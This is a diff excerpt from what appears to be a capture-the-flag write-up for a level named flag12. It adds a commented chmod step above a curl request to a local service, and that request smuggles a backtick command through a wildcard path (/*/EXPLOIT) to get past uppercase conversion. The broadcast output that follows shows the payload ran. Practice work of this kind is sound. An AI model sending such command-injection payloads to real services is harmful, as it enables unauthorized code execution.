@@ -17,7 +17,9 @@ getflag | wall
  
  # Hmmm how do we call it if we want to pass the regex ? /tmp/exploit become /TMP/EXPLOIT, so /tmp/EXPLOIT ? Not yet, /*/EXPLOIT ! Wildcard bb !
  # Let's make our request
- 
+
+# chmod +x /tmp/EXPLOIT
+
  curl localhost:4646?x='`/*/EXPLOIT`' # Don't forget the backtick again
  
 >Broadcast Message from flag12@Snow
